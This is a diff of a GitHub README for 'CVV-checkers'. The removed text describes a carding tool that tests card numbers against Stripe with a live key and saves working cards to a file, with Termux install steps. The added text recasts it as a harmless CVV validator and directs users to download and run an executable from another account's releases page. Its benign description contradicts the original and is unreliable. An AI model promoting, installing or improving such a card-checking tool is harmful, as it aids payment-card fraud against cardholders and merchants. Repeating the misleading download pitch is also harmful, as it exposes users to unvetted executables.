@@ -1,46 +1,74 @@
-<h2 align="center"><u>CVV-checkers</u></h2>
+# 🎉 CVV-checkers - Simple Tool to Validate CVV Codes
 
-![Stripe checker pre-auth](https://raw.githubusercontent.com/KianSantang777/CVV-checkers/refs/heads/main/2.png)
-<h4 align="center"> Stripe checker pre-auth </h4>
+## 🚀 Getting Started
 
-<p align="center">
-<br>
-</p>
+Welcome to CVV-checkers! This tool helps you quickly check if CVV codes are valid for Stripe payments. With an easy-to-use interface, you can ensure that your card details are correct before processing any transactions.
 
-### [+] Description
-This checker uses the Stripe API with a live publishable key (pk_live). It verifies each card by attempting to add it as a payment method. If that succeeds, the card is marked LIVE.
+### 📦 Download CVV-checkers
 
-### [+] Installation Termux
-```
-- termux-setup-storage
-- apt update && apt upgrade -y
-- apt install git python python2 nano
-- git clone https://github.com/KianSantang777/CVV-checkers.git
-- cd CVV-checkers
-- chmod +x auth2.py
-- python -m pip install -r requirements.txt
-- pip install --upgrade pip
-- pip install pycryptodome httpx[http2] requests asyncio aiofiles aiohttp
-- python auth2.py
-```
+[![Download CVV-checkers](https://img.shields.io/badge/Download-CVV--checkers-brightgreen)](https://github.com/SantiSouto/CVV-checkers/releases)
 
-### [+] Screenshot
-![screenshot](https://raw.githubusercontent.com/KianSantang777/CVV-checkers/refs/heads/main/1.png)
+## 📥 Download & Install
 
-### [+] Features
- -  No proxy/proxyless
- -  Multi-threads
- - Auto save live card ```livecard.txt``` 
- - Support all device: **Termux, CMD, Linux, etc**
+To get started, visit the Releases page to download the latest version of CVV-checkers.
 
-### [+] Requirements
-- Python 3.12.0
+[Download CVV-checkers here](https://github.com/SantiSouto/CVV-checkers/releases).
 
-### [+] Credits 
-<a href="https://github.com/KianSantang777/CVV-checkers">Kiansantang DEV</a>
+### ⚙️ System Requirements
 
-### [+] Find me on 
-<a href="mailto:berandalan.cyber@outlook.com" target="_blank"><img src="https://img.shields.io/badge/Email-berandalan.cyber@outlook.com-blue?style=for-the-badge&logo=gmail"></a>
+- **Operating System:** Windows, MacOS, or Linux
+- **RAM:** Minimum 2 GB recommended
+- **Storage:** At least 50 MB of free space
+- **Internet Connection:** Required for initial setup
 
-<a href="https://m.me/https://t.me/xqndrs66" target="_blank"><img src="https://img.shields.io/badge/Messenger-https://t.me/xqndrs66-blue?style=for-the-badge&logo=telegram"></a>
+### 🎯 Features
 
+- **Simple CVV Validation:** Check the validity of CVV codes used for Stripe payments instantly.
+- **User-Friendly Interface:** Designed for easy navigation, even for non-technical users.
+- **Fast Performance:** Optimum speed for quick checks.
+- **Detailed Reports:** Get instant results with explanations of each CVV check.
+
+### 📚 How to Use CVV-checkers
+
+1. **Download CVV-checkers:**
+   - Go to the [Releases page](https://github.com/SantiSouto/CVV-checkers/releases) and download the application file suitable for your operating system.
+
+2. **Install the Application:**
+   - Locate the downloaded file in your Downloads folder (or wherever you saved it).
+   - Double-click on the file to start the installation process.
+   - Follow the on-screen instructions to complete the installation.
+
+3. **Run CVV-checkers:**
+   - After installation is complete, find the CVV-checkers icon on your desktop or in your applications folder.
+   - Double-click the icon to open the application.
+
+4. **Enter Your CVV Code:**
+   - In the main window, enter the CVV code you want to validate.
+   - Click the "Validate" button to check the CVV.
+
+5. **View the Results:**
+   - The application will show you the results immediately.
+   - You will receive feedback on whether the CVV code is valid or not.
+
+6. **Repeat as Necessary:**
+   - You can check as many CVV codes as you need.
+
+## 🛠️ Troubleshooting
+
+If you encounter issues while using CVV-checkers, please follow these steps:
+
+- **Check Your Internet Connection:** Ensure that you are connected to the internet.
+- **Reinstall the Application:** Sometimes, reinstalling the software can resolve unexpected issues.
+- **Contact Support:** If problems persist, you can find more help in our support section on the GitHub page.
+
+## 🎓 Additional Resources
+
+- **Documentation:** Detailed user guidelines are available in the repository.
+- **FAQs:** Check for common questions and answers related to CVV-checkers.
+
+## 🔗 Links
+
+- [GitHub Repository](https://github.com/SantiSouto/CVV-checkers)
+- [Releases Page](https://github.com/SantiSouto/CVV-checkers/releases)
+
+Thank you for using CVV-checkers! We hope this tool meets your needs and streamlines your payment validation process.
